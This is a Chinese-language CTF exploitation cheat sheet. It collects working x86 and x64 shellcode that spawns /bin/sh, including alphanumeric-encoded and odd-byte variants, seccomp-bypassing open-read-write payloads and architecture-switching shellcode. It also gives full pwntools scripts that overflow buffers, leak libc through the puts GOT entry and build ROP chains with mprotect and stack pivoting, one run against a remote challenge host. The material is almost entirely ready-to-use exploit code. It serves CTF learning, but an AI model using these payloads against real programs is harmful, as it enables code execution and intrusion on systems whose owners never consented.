# Shellcode-ALL

‍

‍

## 基础汇编代码

‍

```asm
# 交换寄存器内容
xchg eax, edi


# 清空寄存器
xor ebx,ebx ; ebx = 0


# rax = rbp-0x18 不会改变rbp的值
lea rax,[rbp-0x18]


test eax,eax   => cmp eax,0


# 特殊寄存器
mov rdi, xmm0
mov rdi, xmm1
mov rdi, xmm2..
```

‍

- leave

```python
leave  = mov esp,ebp; pop ebp
leave
ret = pop eip
```

‍

- call

```asm
‍‍‍‍```python
call  == push rip  ; jmp
‍‍‍‍```

```

‍

‍

‍

```python
hex(int.from_bytes(b'/bin/sh\x00',"little"))
'0x68732f6e69622f


bin_sh_hex = int.from_bytes(b'/bin/sh\x00',"little")

```

‍

‍

## X86 标准shellcode

```python
def x86_shellcode():
    # eax 0xb
    # ebx /bin/sh
    # ecx 0
    # edx 0

    # sh
    # push 0x006873
    shellcode = '''
    xor ecx,ecx
    xor edx,edx
    push 0xb
    pop eax
    push 0x0068732f
    push 0x6e69622f
    mov ebx,esp
    int 0x80
    '''
    shellcode = asm(shellcode)
    print('shellcode Length:',len(shellcode))
    print(disasm(shellcode))
    return shellcode
```

## X64 shellcode

‍

- TEST-1

```python
def x64_shellcode():
    # rax 0x3b
    # rdi /bin/sh
    # rsi 0
    # rdx 0
    shellcode = bytes.fromhex("4831f64831d26a3b5848bf2f62696e2f73680057488d3c240f05")
    shellcode = '''
    xor rsi, rsi
    xor rdx, rdx
    push 0x3b
    pop rax
    mov rdi,0x68732f6e69622f
    push   rdi
    lea rdi,[rsp]
    syscall
    '''
    shellcode = asm(shellcode)
    print('shellcode Length:',len(shellcode))
    print(disasm(shellcode))
    print("shellcode Length : ",len(shellcode))
    return shellcode
```

‍

- TEST-2

‍

```python
shellcode = '''
push 0x3b
pop rax
movabs rbx, 0x68732f6e69622f
push   rbx
push   rsp
pop    rdi
cdq  
push rdx
pop rsi
syscall
'''
#   0:   6a 3b                   push   0x3b
#   2:   58                      pop    rax
#   3:   48 bb 2f 62 69 6e 2f 73 68 00   movabs rbx, 0x68732f6e69622f
#   d:   53                      push   rbx
#   e:   54                      push   rsp
#   f:   5f                      pop    rdi
#  10:   99                      cdq  
#  11:   52                      push   rdx
#  12:   5e                      pop    rsi
#  13:   0f 05                   syscall
# shellcode Length :  21
```

‍

‍

‍

```python

[+] Starting local process '../challenge/build/challenge': pid 56330
   0:   6a 3b                   push   0x3b
   2:   58                      pop    rax
   3:   31 d2                   xor    edx, edx
   5:   31 f6                   xor    esi, esi
   7:   48 bf 2f 62 69 6e 2f 73 68 00   movabs rdi, 0x68732f6e69622f
  11:   57                      push   rdi
  12:   54                      push   rsp
  13:   5f                      pop    rdi
  14:   0f 05                   syscall
length:  22
sc = b'j;X1\xd21\xf6H\xbf/bin/sh\x00WT_\x0f\x05'
   0:   6a 3b                   push   0x3b
   2:   58                      pop    rax
   3:   48 31 d2                xor    rdx, rdx
   6:   48 31 f6                xor    rsi, rsi
   9:   48 bf 2f 62 69 6e 2f 73 68 00   movabs rdi, 0x68732f6e69622f
  13:   57                      push   rdi
  14:   54                      push   rsp
  15:   5f                      pop    rdi
  16:   0f 05                   syscall
length:  24
sc = b'j;XH1\xd2H1\xf6H\xbf/bin/sh\x00WT_\x0f\x05'
   0:   90                      nop
   1:   31 c0                   xor    eax, eax
   3:   48 bb d1 9d 96 91 d0 8c 97 ff   movabs rbx, 0xff978cd091969dd1
   d:   48 f7 db                neg    rbx
  10:   53                      push   rbx
  11:   54                      push   rsp
  12:   5f                      pop    rdi
  13:   99                      cdq
  14:   52                      push   rdx
  15:   57                      push   rdi
  16:   54                      push   rsp
  17:   5e                      pop    rsi
  18:   b0 3b                   mov    al, 0x3b
  1a:   0f 05                   syscall
length:  28
sc = b'\x901\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05'


```

‍

‍

‍

## 奇你太美

‍

- 针对 只接受奇数的 bytes

```python
0x0000000000000000:  53                push    rbx
0x0000000000000001:  B9 FF FF FF 0F    mov     ecx, 0xfffffff
0x0000000000000006:  83 E9 FD          sub     ecx, -3
0x0000000000000009:  FF C9             dec     ecx
0x000000000000000b:  D1 E1             shl     ecx, 1
0x000000000000000d:  C1 E1 0F          shl     ecx, 0xf
0x0000000000000010:  83 C1 1D          add     ecx, 0x1d
0x0000000000000013:  67 8D 31          lea     esi, [ecx]
0x0000000000000016:  31 FF             xor     edi, edi
0x0000000000000018:  83 C7 03          add     edi, 3
0x000000000000001b:  0F 05             syscall 
/* read调用 */

先构造个read调用，后面就正常写入文件，随便写写大概长度在80左右，如果在字符串的处理上下点功夫应该可以控制长度在60左右


shellcode='''
push    rbx
mov     ecx, 0xfffffff
sub     ecx, -3
dec     ecx
shl     ecx, 1
shl     ecx, 0xf
add     ecx, 0x1d
lea     esi, [ecx]
xor     edi, edi
add     edi, 3
syscall 
'''
pay = asm(shellcode)

```

‍

## shellcode-可见字符

- read

```python
sc ="""
xchg rax,rsi
xor rax,rax
xor rdi,rdi
xchg rdx,r11
syscall
"""
shellcode = asm(sc)
print(disasm(shhellcode))
print(len(shellcode))


Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15371M123g0y1L8N1N4t5M7o1L01
>>> len('Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15371M123g0y1L8N1N4t5M7o1L01')
87
```

 先是 call rax , orw 输入的长度不够，我们可以在次去read

```python
sc = '''
xchg rax,rsi
xor rax,rax
xor rdi,rdi
push 0x78
pop rdx
syscall # read(0,rip,0x78)
'''
# python2 ./ALPHA3.py x64 ascii mixedcase rax --input='shellcode'



Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15371M123g0y1L8N0X0K7m7o1L01
```

‍

‍

‍

- execve

```python
execve("/bin/sh\x00", NULL, NULL);
```

‍

```python
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
```

‍

- orw

```python
sc = shellcraft.open('/flag')
sc += shellcraft.read('rax','rsp',0x40)
sc += shellcraft.write(1,'rsp',0x40)

sc ='''
movabs rax, 0x101010101010101
push   rax
movabs rax, 0x1010166606d672e
xor    QWORD PTR [rsp], rax
mov    rdi, rsp
xor    edx, edx
xor    esi, esi
push   0x2
pop    rax
syscall
mov    rdi, rax
xor    eax, eax
push   0x40
pop    rdx
mov    rsi, rsp
syscall
push   0x1
pop    rdi
push   0x40
pop    rdx
mov    rsi, rsp
push   0x1
pop    rax
syscall
'''


>>> len("Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M154I04050H01050104012x0x4I7N0R1m0Q0V0501000z0I041l1L3P8P1O3r0c3W1702197o0S0x5L3g10400Z0p7p0x3P3F7k0416002s0Y2p0b2x4x390Y0s0h0l060W")
189
```

## shellcode-可见字符(进阶)

‍

‍

‍

‍

## pwntools-生成shellcode

‍

‍

```python
from pwn import *
context(arch='amd64')

payload = shellcraft.cat("/flag")




pay = asm(shellcraft.sh())
```

‍

‍

## 架构转换

‍

```python
from pwn import *

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
ls      = lambda data               :log.success(data)
lss     = lambda s                  :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))

context.arch      = 'amd64'
context.log_level = 'debug'
context.terminal  = ['tmux','splitw','-h','-l','130']
def start(binary,argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.RE:
        return remote()
    else:
        return process([binary] + argv, *a, **kw)


binary = './HappyCTF'
libelf = ''

if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libc
if (libelf!=''): libc = ELF(libelf)

gdbscript = '''
continue
'''.format(**locals())

io = start(binary)

sc = '''
/*mmap(0x40404040, 0x7e, 7, 34, 0, 0)*/
push 0x540000 /*set rdi*/
pop rdi
push 0x1000 /*set rsi*/
pop rsi
push 7 /*set rdx*/
pop rdx
xor r8, r8 /*set r8*/
xor r9, r9 /*set r9*/
push 0x22 /*set rcx*/
pop rcx
push 9   /*set rax*/
pop rax
syscall

/*read(0, 0x40404040, 0x70)*/
xor rdi, rdi
push 0x540000
pop rsi
push 0x70
pop rdx
xor rax, rax
syscall

call rsi
'''


gdb.attach(io)
pay  = asm(shellcraft.mmap(0x10040,0x1000,7,34,0,0))
pay += asm(shellcraft.read(0,0x10040,0x1000))
pay += asm('mov rax,0x10040;call rax')
s(pay)
shellcode_to_x86 = '''
push 0x23
push 0x10050
retfq
'''

shellcode_open = '''
mov esp, 0x10200
push 0
push 0x67616c66
mov ebx, esp
xor ecx, ecx
mov eax,5
int 0x80
'''

shellcode_to_x64 = '''
push 0x33
push 0x10078
retfq
'''

shellcode_read = '''
mov rdi, 3
mov rsi, 0x10100
mov rdx, 0x60
xor rax, rax
syscall
'''

shellcode_write = '''
mov rsi, 0x10100
mov rdx, 0x60
mov rdi, 1
mov rax, 1
syscall
'''

pld = asm(shellcode_to_x86)
pld = pld.ljust(0x10, b'\x90')
pld += asm(shellcode_open)
pld += asm(shellcode_to_x64)
pld = pld.ljust(0x38, b'\x90')
pld += asm(shellcode_read)
pld += asm(shellcode_write)
# gdb.attach(sh)
# pause()
pause()
s(pld)

io.interactive()
```

[pwnlib.shellcraft.amd64 — Shellcode for AMD64 — pwntools 4.11.1 documentation](https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.amd64_to_i386)

‍

‍

‍

## 短ORW-Shellcode_x64

‍

- 这个可以, \x00绕过len() 然后直接orw

```python
sc = shellcraft.open('/flag')
sc += shellcraft.read('rax','rsp',0x40)
sc += shellcraft.write(1,'rsp',0x40)
pay = b'\x00xx' #
pay += asm(sc)
#gdb.attach(io,'b *0x0400AFA')
sl(pay)
```

‍

‍

‍

‍

# ORW

‍

## ORW_shellcode

‍

> 有些时候 pwn 题目中为了增加难度，会使用类似 [seccomp](https://en.wikipedia.org/wiki/Seccomp) 的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿 shell 是不可能了，但是我们 pwn 题是面向 flag 的，所以还是可以通过 orw（ open-read-write ）的方法来读出 flag 的

‍

- 标准一点的

> open read write

```python
payload ='''
mov rax,0x67616c66; 小端 'flag'
push rax

# SYS_open
mov rdi,rsp  ; [rdi] = 'flag' rdi指向的地址存放文件名字符串
mov rsi,0    ; rsi = 0
mov rdx,0    ; rdx = 0
mov rax,2    ; SYS_open
syscall      ;得到一个fd,通常为 3, 执行后会存放在rax里

# SYS_read
mov rdi,rax     ; rax->fd ; rdi = 3
mov rsi,rsp     ;读取文件内容的存储的地址 
mov rdx,1024    ; 读取多少字节
mov rax,0       ; SYS_read
syscall

# SYS_write
mov rdi,1     ;stdout
mov rsi,rsp   ;读取文件内容在 rsp 
mov rdx,rax   ;len
mov rax,1
syscall

# exit
mov rdi,0
mov rax,60
syscall
'''
orw = asm(payload)
```

‍

‍

> SYS_open SYS_rendfile

```python
shellcode_2 = '''
mov rax,0x00000067616c662f # flag
push rax
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
push 2
pop rax
syscall   # sys_open

mov rsi,rax
push 0x28
pop rax
push 1
pop rdi
xor rdx,rdx
syscall   #sys_readfile
'''
```

‍

- pwntools 生成

‍

```python
shellcode_1 = shellcraft.open('/flag')
shellcode_1 += shellcraft.read('rax','rsp',100)
shellcode_1 += shellcraft.write(1,'rsp',100)
orwcd = asm(shellcode_1)
```

```python
elf = ELF('./pwn')
orw_shellcode = asm(shellcraft.open('flag') + shellcraft.read('rax', elf.bss() + 0x100, 0x30) + shellcraft.write(1, elf.bss() + 0x100, 0x30))
```

‍

‍

‍

## ROP ORW

### 示例1

- 漏洞代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  io(argc, argv, envp);
  puts("A bit small, but it doesn't affect me cat flag");
  return read(0, buf, 96uLL);                   // 可以覆盖 rsp的值加 8 字节，
  // 所以说只能控制 rsp 和 ret的地址
}
```

- 首先在 `0x3ff000 ~ 0x400000`​ 里布局，然后把栈迁移到这里，

```python
pwndbg> vp
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x3ff000           0x400000 rw-p     1000      0 /mnt/hgfs/Downloads/aday/Sandbox/pwn
          0x400000           0x401000 r-xp     1000   1000 /mnt/hgfs/Downloads/aday/Sandbox/pwn
          0x401000           0x402000 r-xp     1000   2000 /mnt/hgfs/Downloads/aday/Sandbox/pwn
          0x402000           0x403000 r-xp     1000   3000 /mnt/hgfs/Downloads/aday/Sandbox/pwn
          0x403000           0x404000 r--p     1000   3000 /mnt/hgfs/Downloads/aday/Sandbox/pwn
          0x404000           0x405000 rw-p     1000   4000 /mnt/hgfs/Downloads/aday/Sandbox/pwn
```

```python
*RBP  0x3ff500 —▸ 0x400506 ◂— add byte ptr [rax], al                                                                      
*RSP  0x7ffe9407e188 —▸ 0x4011fd (main+34) ◂— lea rax, [rbp - 0x50]  
*RIP  0x401215 (main+58) ◂— ret                                                                                                                                                                 
───────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────
   0x401206 <main+43>    mov    rsi, rax                                                                                                                                                        
   0x401209 <main+46>    mov    edi, 0                                                                                                                                                          
   0x40120e <main+51>    call   read@plt                      <read@plt>                                          
   0x401213 <main+56>    nop
   0x401214 <main+57>    leave
 ► 0x401215 <main+58>    ret                                  <0x4011fd; main+34>                                                                             
    ↓                                     
   0x4011fd <main+34>    lea    rax, [rbp - 0x50]
   0x401201 <main+38>    mov    edx, 0x60                                                   
   0x401206 <main+43>    mov    rsi, rax                                                    
   0x401209 <main+46>    mov    edi, 0                                                      
   0x40120e <main+51>    call   read@plt                      <read@plt>
```

### 示例2

- 需要知道libc的基地址
- 沙箱,不能执行 execve

```c
int sandbox()
{
  __int16 v1; // [rsp+0h] [rbp-40h] BYREF
  __int16 *v2; // [rsp+8h] [rbp-38h]
  __int16 v3; // [rsp+10h] [rbp-30h] BYREF
  char v4; // [rsp+12h] [rbp-2Eh]
  char v5; // [rsp+13h] [rbp-2Dh]
  int v6; // [rsp+14h] [rbp-2Ch]
  __int16 v7; // [rsp+18h] [rbp-28h]
  char v8; // [rsp+1Ah] [rbp-26h]
  char v9; // [rsp+1Bh] [rbp-25h]
  int v10; // [rsp+1Ch] [rbp-24h]
  __int16 v11; // [rsp+20h] [rbp-20h]
  char v12; // [rsp+22h] [rbp-1Eh]
  char v13; // [rsp+23h] [rbp-1Dh]
  int v14; // [rsp+24h] [rbp-1Ch]
  __int16 v15; // [rsp+28h] [rbp-18h]
  char v16; // [rsp+2Ah] [rbp-16h]
  char v17; // [rsp+2Bh] [rbp-15h]
  int v18; // [rsp+2Ch] [rbp-14h]
  __int16 v19; // [rsp+30h] [rbp-10h]
  char v20; // [rsp+32h] [rbp-Eh]
  char v21; // [rsp+33h] [rbp-Dh]
  int v22; // [rsp+34h] [rbp-Ch]

  v3 = 32;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 21;
  v8 = 2;
  v9 = 0;
  v10 = 59;
  v11 = 21;
  v12 = 1;
  v13 = 0;
  v14 = 322;
  v15 = 6;
  v16 = 0;
  v17 = 0;
  v18 = 2147418112;
  v19 = 6;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  v1 = 5;
  v2 = &v3;
  prctl(38, 1LL, 0LL, 0LL, 0LL);
  return prctl(22, 2LL, &v1);
}

```

```python
-➤  seccomp-tools dump ./vuln
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004
 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x06 0x00 0x00 0x00000000  return KILL
```

#### 漏洞点，溢出长度不是很多

```python
ssize_t vuln()
{
  char buf[256]; // [rsp+0h] [rbp-100h] BYREF

  return read(0, buf, 0x130uLL);
}
```

#### 利用思路

- 先泄露puts的地址，再计算libcbase

```python
from pwn import *
context(arch='amd64')

binary = './vuln'
io = process(binary)
elf = ELF(binary)
rop = ROP(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc-2.31.so')


pop_rdi_addr = rop.find_gadget(['pop rdi','ret'])[0]


payload  = b'A' * (256 + 8)
payload += p64(pop_rdi_addr) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x0040131D) # call vuln

io.recvuntil('this task.\n')
#gdb.attach(io,'b *0x4012E3')
io.sendline(payload)

puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
elf_base  = puts_addr - libc.sym['puts']
log.success('elf_base: '+hex(elf_base))

```

- 然后使用 read 读取我们的payload 且迁移栈的位置

```python
libc_file = '/lib/x86_64-linux-gnu/libc.so.6'
libc_rop = ROP(libc_file)

def f(Str):
    return elf_base + libc_rop.find_gadget([Str,'ret'])[0]


#syscall_ret = elf_base + libc_rop.find_gadget(['syscall','ret'])[0]
syscall_ret = f('syscall')
pop_rax = f('pop rax')
pop_rdi = f('pop rdi')
pop_rsi = f('pop rsi')
pop_rbx = f('pop rbx')
pop_adb   = elf_base +  0x0000000000090528 # pop rax ; pop rdx ; pop rbx ; ret

rw = elf_base + 2211840  # 把栈迁到这里顺便找的

lr = 0x4012EE # leave ret
xor_rax = elf_base + 0x00000000000404f8 # xor eax, eax ; ret
read = flat(
        'A' * (256),
        rw,   
        xor_rax,
        pop_rsi,rw,
        syscall_ret,
        lr # leave ret
        )
io.send(read)
```

- 上面的之后会让用户再次输入，此时传入的payload 会存在 rw的位置

```python
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)
shellcode = asm(shellcode)

orw_rop = flat(
        'A' * 0x8,
        pop_rdi, rw,     # rdi addr
        pop_rsi, 0x1000, # rsi length
        pop_adb, 0,7,0,  # rdx per 
        elf_base + libc.sym['mprotect'], # 修改 权限
        rw + 0x70, # 此时栈已经 rwx了 所以直接返回到栈上执行代码
        '\x90'*0x20,
        shellcode 
        )

io.sendline(orw_rop)
```

‍

## Shellcode ORW

> 有些时候 pwn 题目中为了增加难度，会使用类似 [seccomp](https://en.wikipedia.org/wiki/Seccomp) 的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿 shell 是不可能了，但是我们 pwn 题是面向 flag 的，所以还是可以通过 orw（ open-read-write ）的方法来读出 flag 的

#### orw payload 1

> open read write

```python
payload ='''
mov rax,0x67616c66; 小端 'flag'
push rax

# SYS_open
mov rdi,rsp  ; [rdi] = 'flag' rdi指向的地址存放文件名字符串
mov rsi,0    ; rsi = 0
mov rdx,0    ; rdx = 0
mov rax,2    ; SYS_open
syscall      ;得到一个fd,通常为 3, 执行后会存放在rax里

# SYS_read
mov rdi,rax     ; rax->fd ; rdi = 3
mov rsi,rsp     ;读取文件内容的存储的地址 
mov rdx,1024    ; 读取多少字节
mov rax,0       ; SYS_read
syscall

# SYS_write
mov rdi,1     ;stdout
mov rsi,rsp   ;读取文件内容在 rsp 
mov rdx,rax   ;len
mov rax,1
syscall

# exit
mov rdi,0
mov rax,60
syscall
'''
```

#### orw payload 2

> open read write

```python
payload = """
mov rax,0x00000067616c662f
push rax
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
push 2
pop rax
syscall

mov rdi,rax
mov rdx,1024
xor rax,rax
mov rsi,rsp
syscall

push 1
pop rax
push 1
pop rdi
mov rsi,rsp
syscall
"""
print(len(asm(payload)))
```

#### orw payload-3

- pwntools 直接生成

```python
code = shellcraft.open("./flag")
code += shellcraft.read(3, 0x404900, 0x50)  # 中间的文件内容存储地址
code += shellcraft.write(1, 0x404900, 0x50)
shellcode = asm(code)
```

#### 直接用pwntool生成shellcode

```python
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)
payload = asm(shellcode)

```

#### orw payload-5-ROP-x64

```python
from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
ls      = lambda data               :log.success(data)
lss     = lambda s                  :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
context.arch      = 'amd64'
context.log_level = 'debug'
context.terminal  = ['tmux','splitw','-h','-l','130']
def start(binary,argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.RE:
        return remote()
    else:
        return process([binary] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

binary = './intorw'
libelf = './libc.so.6'

if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)
if (libelf!=''): libc = ELF(libelf)
#libc = elf.libc
io = start(binary)
io = remote('node5.anna.nssctf.cn',28571)

#gdb.attach(io,'#b *0x04009EB')

ru('Please enter how many bits you want to read\n')
sl('-1')
ru('Please enter what you want to read:\n')
pay = b'A' * 0x28 + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x004009C4)
sl(pay)
x = uu64(r(6))
libc_base = x - libc.sym['puts']

libc.address = libc_base
libc_rop = ROP(libc)


def f(Str):
        return libc_rop.find_gadget([Str,'ret'])[0]
#syscall_ret = elf_base + libc_rop.find_gadget(['syscall','ret'])[0]
syscall_ret = f('syscall')
rax = f('pop rax')
rdi = f('pop rdi')
rsi = f('pop rsi')
rbx = f('pop rbx')
rdx = libc_base + 0x000000000011f497 # pop rdx ; pop r12 ; ret
#rdx = libc_base + 0x000000000011f4d7 # pop rdx ; pop r12 ; ret

bss  = 0x601000+0x800
#
ru('Please enter how many bits you want to read\n')
sl('-1')
ru('Please enter what you want to read:\n')
pay = b'A' * 0x20 + p64(bss) + p64(rdi) + p64(0) + p64(rsi) + p64(bss) + p64(elf.plt['read']) + p64(0x0400A45)
sl(pay)

pause()

orw_rop  = b'flag\x00\x00\x00\x00'
orw_rop += p64(rdi) + p64(bss) + p64(rsi) + p64(4) + p64(libc.sym['open'])
orw_rop += p64(rdi) + p64(3) + p64(rsi) + p64(bss-0x100) + p64(rdx) + p64(0x100) * 2 + p64(libc.sym['read'])
orw_rop += p64(rdi) + p64(1) + p64(rsi) + p64(bss-0x100) + p64(rdx) + p64(0x100) * 2 + p64(libc.sym['write'])
sl(orw_rop)




ls(hex(libc_base))







io.interactive()
```

‍

‍

‍

```python
libc.address = libc_base
puts_ = libc.sym['puts']
open_ = libc.sym['open']
read  = libc.sym['read']
__free_hook = libc.sym['__free_hook']

libc_rop = ROP(libc)
rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]
rsi = libc_rop.find_gadget(['pop rsi','ret'])[0]
rdx = libc_rop.find_gadget(['pop rdx','ret'])[0]

orw_rop  = p64(rdi) + p64(0) + p64(rsi) + p64(__free_hook) + p64(rdx) +p64(0x200) + p64(read)
orw_rop += p64(rdi) + p64(__free_hook)  + p64(rsi) + p64(4) + p64(open_)
orw_rop += p64(rdi) + p64(3) + p64(rsi) + p64(__free_hook) + p64(rdx) +p64(0x200) + p64(read)
#orw_rop += p64(rdi) + p64(1) + p64(rsi) + p64(__free_hook) + p64(rdx) +p64(0x200) + p64(write)
orw_rop += p64(rdi) + p64(__free_hook) + p64(puts_)
```

‍

‍

‍

‍

‍

> SYS_open SYS_rendfile

```python
payload = """
mov rax,0x00000067616c662f
push rax
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
push 2
pop rax
syscall   # sys_open

mov rsi,rax
push 0x28
pop rax
push 1
pop rdi
xor rdx,rdx
syscall   #sys_readfile
"""
```

‍
